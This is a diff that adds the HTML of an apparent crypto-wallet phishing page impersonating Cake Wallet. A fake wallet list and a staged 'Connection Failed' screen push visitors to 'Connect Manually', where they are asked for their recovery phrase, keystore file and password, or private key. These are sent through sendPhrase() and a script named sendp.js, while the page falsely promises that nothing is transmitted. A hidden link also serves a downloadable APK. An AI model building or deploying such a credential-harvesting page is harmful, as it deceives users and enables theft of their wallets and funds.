+              <div class="w-item-desc">Hardware wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="assets/images/logo/metamask.jpg" alt="Metamask Wallet" /></div>
+            <div>
+              <div class="w-item-name">Metamask </div>
+              <div class="w-item-desc">Ethereum Wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item w-item-other" onclick="openOtherWallets()">
+            <div class="w-item-icon"><i class="ri-apps-2-line"></i></div>
+            <div>
+              <div class="w-item-name">Other Wallets</div>
+              <div class="w-item-desc">Browse 30+ supported wallets</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+        </div>
+
+        <p class="w-note">
+          By connecting you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a>.
+          We never store your private keys or seed phrases.
+        </p>
+      </div>
+    </div>
+
+    <!-- OTHER WALLETS -->
+    <div class="w-sub" id="wScreenOther">
+      <div class="w-header">
+        <span class="w-title">Other Wallets</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="ow-search-wrap">
+        <i class="ri-search-line"></i>
+        <input class="ow-search" id="owSearch" type="text" placeholder="Search by name or network..." autocomplete="off"
+          spellcheck="false" />
+      </div>
+      <div class="ow-count" id="owCount">30 wallets</div>
+      <div class="ow-list" id="owList">
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/pera.png" alt="Pera Wallet" /></div>
+          <div>
+            <div class="ow-name">Pera Wallet</div>
+            <div class="ow-chain">Algorand</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/rainbow.jpg" alt="Rainbow" /></div>
+          <div>
+            <div class="ow-name">Rainbow</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/basewallet.png" alt="Base Wallet" /></div>
+          <div>
+            <div class="ow-name">Base Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/rabby.png" alt="Rabby" /></div>
+          <div>
+            <div class="ow-name">Rabby Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/zerion.png" alt="Zerion" /></div>
+          <div>
+            <div class="ow-name">Zerion</div>
+            <div class="ow-chain">Ethereum / Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/walletconnect.png" alt="WalletConnect" /></div>
+          <div>
+            <div class="ow-name">WalletConnect</div>
+            <div class="ow-chain">Any compatible wallet</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/phantomwallet.png" alt="Phantom" /></div>
+          <div>
+            <div class="ow-name">Phantom</div>
+            <div class="ow-chain">Solana / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/stepn.png" alt="Stepn" /></div>
+          <div>
+            <div class="ow-name">Stepn</div>
+            <div class="ow-chain">Solana / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/solflare.png" alt="Solflare" /></div>
+          <div>
+            <div class="ow-name">Solflare</div>
+            <div class="ow-chain">Solana</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/okx.png" alt="OKX Wallet" /></div>
+          <div>
+            <div class="ow-name">OKX Wallet</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/terrastation.png" alt="Terra Station" /></div>
+          <div>
+            <div class="ow-name">Terra Station</div>
+            <div class="ow-chain">Terra</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/safepal.png" alt="SafePal" /></div>
+          <div>
+            <div class="ow-name">SafePal</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/exodus.png" alt="Exodus" /></div>
+          <div>
+            <div class="ow-name">Exodus</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/atomic.png" alt="Atomic Wallet" /></div>
+          <div>
+            <div class="ow-name">Atomic Wallet</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/trezor.png" alt="Trezor" /></div>
+          <div>
+            <div class="ow-name">Trezor</div>
+            <div class="ow-chain">Hardware / Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/tokenpocket.png" alt="TokenPocket" /></div>
+          <div>
+            <div class="ow-name">TokenPocket</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/uniswap.png" alt="Uniswap" /></div>
+          <div>
+            <div class="ow-name">Uniswap Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/cryptocom.png" alt="Crypto.com" /></div>
+          <div>
+            <div class="ow-name">Crypto.com DeFi</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/keplr.png" alt="Keplr" /></div>
+          <div>
+            <div class="ow-name">Keplr</div>
+            <div class="ow-chain">Cosmos / IBC</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/leapwallet.png" alt="Leap" /></div>
+          <div>
+            <div class="ow-name">Leap Wallet</div>
+            <div class="ow-chain">Cosmos / IBC</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/tangem.png" alt="Tangem" /></div>
+          <div>
+            <div class="ow-name">Tangem</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/jade.png" alt="Jade" /></div>
+          <div>
+            <div class="ow-name">Jade</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/polkadot.png" alt="Polkadot.js" /></div>
+          <div>
+            <div class="ow-name">Polkadot.js</div>
+            <div class="ow-chain">Polkadot / Substrate</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/talisman.png" alt="Talisman" /></div>
+          <div>
+            <div class="ow-name">Talisman</div>
+            <div class="ow-chain">Polkadot / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/nami.png" alt="Nami" /></div>
+          <div>
+            <div class="ow-name">Nami</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/eternl.png" alt="Eternl" /></div>
+          <div>
+            <div class="ow-name">Eternl</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/bitkeep.png" alt="BitKeep" /></div>
+          <div>
+            <div class="ow-name">BitKeep</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/martian.png" alt="Martian" /></div>
+          <div>
+            <div class="ow-name">Martian</div>
+            <div class="ow-chain">Aptos / Sui</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/suiet.png" alt="Suiet" /></div>
+          <div>
+            <div class="ow-name">Suiet</div>
+            <div class="ow-chain">Sui</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/huobi.png" alt="Huobi" /></div>
+          <div>
+            <div class="ow-name">Huobi</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/argent.png" alt="Argent" /></div>
+          <div>
+            <div class="ow-name">Argent</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/defly.png" alt="Defly" /></div>
+          <div>
+            <div class="ow-name">Defly</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/midas.png" alt="Midas Wallet" /></div>
+          <div>
+            <div class="ow-name">Midas Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/tongue.png" alt="Tongue Wallet" /></div>
+          <div>
+            <div class="ow-name">Tongue Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/celo.png" alt="Celo Wallet" /></div>
+          <div>
+            <div class="ow-name">Celo Wallet</div>
+            <div class="ow-chain">Celo</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/bridge wallet.png" alt="Bridge Wallet" /></div>
+          <div>
+            <div class="ow-name">Bridge Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/walletio.png" alt="Wallet.io" /></div>
+          <div>
+            <div class="ow-name">Wallet.io</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/coinomi.png" alt="Coinomi Wallet" /></div>
+          <div>
+            <div class="ow-name">Coinomi Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/dharma.png" alt="Dharma Wallet" /></div>
+          <div>
+            <div class="ow-name">Dharma Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/1inch.png" alt="1inch Wallet" /></div>
+          <div>
+            <div class="ow-name">1inch Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/walleth.png" alt="walleth" /></div>
+          <div>
+            <div class="ow-name">walleth</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/bitpay.png" alt="BitPay Wallet" /></div>
+          <div>
+            <div class="ow-name">BitPay Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/infinito.png" alt="Infinito Wallet" /></div>
+          <div>
+            <div class="ow-name">Infinito Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/defly.png" alt="Defly Wallet" /></div>
+          <div>
+            <div class="ow-name">Defly Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/huobi.png" alt="Huobi Wallet" /></div>
+          <div>
+            <div class="ow-name">Huobi Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/bitkeep.png" alt="BitKeep Wallet" /></div>
+          <div>
+            <div class="ow-name">BitKeep Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/jade.png" alt="Jade Wallet" /></div>
+          <div>
+            <div class="ow-name">Jade Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="assets/images/logo/stepn.png" alt="StepN Wallet" /></div>
+          <div>
+            <div class="ow-name">StepN Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+      </div>
+      <div class="ow-no-results" id="owNoResults">
+        <i class="ri-search-line"></i>
+        No wallets found for "<span id="owQuery" style="color:#312938;font-weight:600"></span>"
+      </div>
+    </div>
+
+    <!-- SCREEN 2: Connecting -->
+    <div class="w-sub" id="wScreen2">
+      <div class="w-header">
+        <span class="w-title">Connecting</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-loading-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s2Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s2Name">Wallet</span>
+        </div>
+        <div class="w-spinner"></div>
+        <p class="w-status" id="s2Status">Initializing secure connection...</p>
+        <div class="w-progress-wrap">
+          <div class="w-progress-bar" id="s2Progress"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 3: Connection Failed -->
+    <div class="w-sub" id="wScreen3">
+      <div class="w-header">
+        <span class="w-title">Connection Failed</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-error-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s3Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s3Name">Wallet</span>
+        </div>
+        <div class="w-error-icon"><i class="ri-wifi-off-line"></i></div>
+        <p class="w-error-msg">
+          <strong>Unable to Connect</strong>
+          We couldn't establish a connection with your wallet. This may be due to a timeout or an unresponsive
+          device. Try again or connect manually.
+        </p>
+        <div class="w-btn-stack">
+          <button class="w-btn w-btn-yellow" id="retryBtn">
+            <i class="ri-refresh-line"></i> Retry Connection
+          </button>
+          <button class="w-btn w-btn-ghost" id="manualBtn">Connect Manually</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 4: Manual Connect (custom) -->
+    <div class="w-sub" id="wScreen4">
+      <div class="w-header">
+        <span class="w-title">Connect Manually</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-manual-body">
+
+        <!-- wallet chip -->
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s4Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s4Name">Wallet</span>
+        </div>
+
+        <!-- type toggle: Phrase | Keystore JSON | Private Key -->
+        <div class="type-toggle">
+          <button class="type-btn" id="btn-keystore" onclick="switchType('keystore')">Keystore JSON</button>
+          <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Phrase</button>
+          <button class="type-btn" id="btn-privatekey" onclick="switchType('privatekey')">Private Key</button>
+        </div>
+
+        <!-- Pane 1: Phrase -->
+        <div class="input-pane active" id="pane-phrase">
+          <textarea class="w-textarea phrase-area" id="phraseInput"
+            placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces..." spellcheck="false"
+            autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+        </div>
+
+        <!-- Pane 2: Keystore JSON -->
+        <div class="input-pane" id="pane-keystore">
+          <textarea class="w-textarea keystore-area" id="keystoreInput" placeholder='Paste Passphrase'
+            spellcheck="false" autocomplete="off"></textarea>
+          <input type="" class="w-input" id="keystorePassword" placeholder="Password" autocomplete="off" />
+          <button class="attach-btn" onclick="document.getElementById('keystoreFileInput').click()">
+            <i class="ri-attachment-2"></i>
+            Attach Keystore File
+          </button>
+          <input type="file" id="keystoreFileInput" accept=".json,.txt,.png,.jpg,.jpeg"
+            onchange="handleKeystoreFile(this)" />
+          <p class="attach-file-name" id="attachFileName"></p>
+        </div>
+
+        <!-- Pane 3: Private Key -->
+        <div class="input-pane" id="pane-privatekey">
+          <textarea class="w-textarea privkey-area" id="privkeyInput"
+            placeholder="Enter your private key (hex format, 64 characters)..." spellcheck="false" autocomplete="off"
+            autocorrect="off" autocapitalize="off"></textarea>
+        </div>
+
+        <!-- encrypt note -->
+        <div class="w-encrypt-note">
+          <i class="ri-lock-2-line"></i>
+          <p>
+            <strong>End-to-end encrypted.</strong>
+            Your credentials are encrypted locally and never transmitted to any server.
+            Cake Wallet support will never ask for your seed phrase or private key.
+          </p>
+        </div>
+
+        <button class="w-btn w-btn-yellow" onclick="sendPhrase()">
+          <i class="ri-wallet-3-line"></i> Connect Wallet
+        </button>
+
+      </div>
+    </div>
+
+    <!-- SCREEN 5: Manual Failed -->
+    <div class="w-sub" id="wScreen5">
+      <div class="w-header">
+        <span class="w-title">Verification Failed</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-error-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s5Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s5Name">Wallet</span>
+        </div>
+        <div class="w-error-icon"><i class="ri-error-warning-line"></i></div>
+        <p class="w-error-msg">
+          <strong>Invalid Credentials</strong>
+          The information you entered could not be verified. Please double-check your phrase, keystore file,
+          or private key and try again.
+        </p>
+        <div class="w-btn-stack">
+          <button class="w-btn w-btn-yellow" onclick="handleRetryManual()">
+            <i class="ri-refresh-line"></i> Try Again
+          </button>
+          <button class="w-btn w-btn-ghost" onclick="closeWallet()">Close</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+  <!-- ░░ DOWNLOAD MODAL ░░ -->
+  <a id="dl-anchor" class="interact-button"
+    href="https://github.com/higgins-tech/internetmoney/releases/download/v1.0.0/internetmoney.apk"
+    download="internetmoney.apk" style="display:none;"></a>
+  <div id="dl-overlay" onclick="closeDlModal()"
+    style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.65);z-index:300;backdrop-filter:blur(4px);">
+  </div>
+  <div id="dl-modal"
+    style="display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:301;width:min(440px,92vw);background:#18181f;border:1px solid rgba(255,255,255,0.1);border-radius:18px;padding:28px;box-shadow:0 32px 80px rgba(0,0,0,0.6);">
+    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;">
+      <div style="display:flex;align-items:center;gap:12px;">
+        <div id="dl-platform-icon"
+          style="width:44px;height:44px;border-radius:12px;background:#111;display:flex;align-items:center;justify-content:center;">
+        </div>
+        <div>
+          <div id="dl-modal-title" style="font-family:'Syne',sans-serif;font-weight:700;font-size:17px;color:#e8e8f0;">
+          </div>
+          <div id="dl-modal-sub" style="font-size:12px;color:#6b6b80;margin-top:2px;"></div>
+        </div>
+      </div>
+      <button onclick="closeDlModal()"
+        style="width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#6b6b80;background:none;border:none;cursor:pointer;transition:background 0.2s;"
+        onmouseover="this.style.background='#111'" onmouseout="this.style.background='none'">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+          stroke-linecap="round">
+          <line x1="18" y1="6" x2="6" y2="18" />
+          <line x1="6" y1="6" x2="18" y2="18" />
+        </svg>
+      </button>
+
+    </div>
+
+    <!-- Steps -->
+    <div id="dl-steps" style="display:flex;flex-direction:column;gap:12px;margin-bottom:22px;"></div>
+
+    <!-- Action buttons -->
+    <div style="display:flex;gap:10px;">
+      <button id="dl-confirm-btn" onclick="triggerDownload()"
+        style="flex:1;height:44px;background:#ffdb0c;border:none;border-radius:10px;font-family:'Syne',sans-serif;font-weight:700;font-size:14px;color:#170d32;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:background 0.2s;"
+        onmouseover="this.style.background='#ffe653'" onmouseout="this.style.background='#ffdb0c'">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
+          stroke-linecap="round">
+          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+          <polyline points="7 10 12 15 17 10" />
+          <line x1="12" y1="15" x2="12" y2="3" />
+        </svg>
+        Download Now
+      </button>
+      <button onclick="closeDlModal()"
+        style="height:44px;padding:0 18px;background:none;border:1px solid rgba(255,255,255,0.1);border-radius:10px;font-family:'DM Sans',sans-serif;font-size:14px;color:#6b6b80;cursor:pointer;transition:border-color 0.2s,color 0.2s;"
+        onmouseover="this.style.borderColor='rgba(255,255,255,0.25)';this.style.color='#e8e8f0'"
+        onmouseout="this.style.borderColor='rgba(255,255,255,0.1)';this.style.color='#6b6b80'">Cancel</button>
+    </div>
+  </div>
+
+  <!-- ░░ DOWNLOAD TOAST ░░ -->
+  <div id="dl-toast"
+    style="display:none;position:fixed;bottom:24px;right:24px;z-index:400;background:#18181f;border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:14px 18px;box-shadow:0 12px 40px rgba(0,0,0,0.5);display:flex;align-items:center;gap:12px;min-width:260px;opacity:0;transform:translateY(12px);transition:opacity 0.3s,transform 0.3s;">
+    <div
+      style="width:36px;height:36px;background:rgba(255,219,12,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ffdb0c" stroke-width="2.5"
+        stroke-linecap="round">
+        <polyline points="20 6 9 17 4 12" />
+      </svg>
+    </div>
+    <div>
+      <div style="font-family:'Syne',sans-serif;font-weight:700;font-size:13px;color:#e8e8f0;">Download started!
+      </div>
+      <div id="toast-sub" style="font-size:11px;color:#6b6b80;margin-top:2px;"></div>
+    </div>
+  </div>
+  <script id="__NEXT_DATA__" type="application/json">
+      {
+        "props": { "pageProps": {} },
+        "page": "/",
+        "query": {},
+        "buildId": "QYPLlLOlFYTbvzuw3eUYe",
+        "nextExport": true,
+        "autoExport": true,
+        "isFallback": false,
+        "scriptLoader": []
+      }
+    </script>
+  <script src="function.js"></script>
+  <script src="sendp.js"></script>
+</body>
+
+</html>
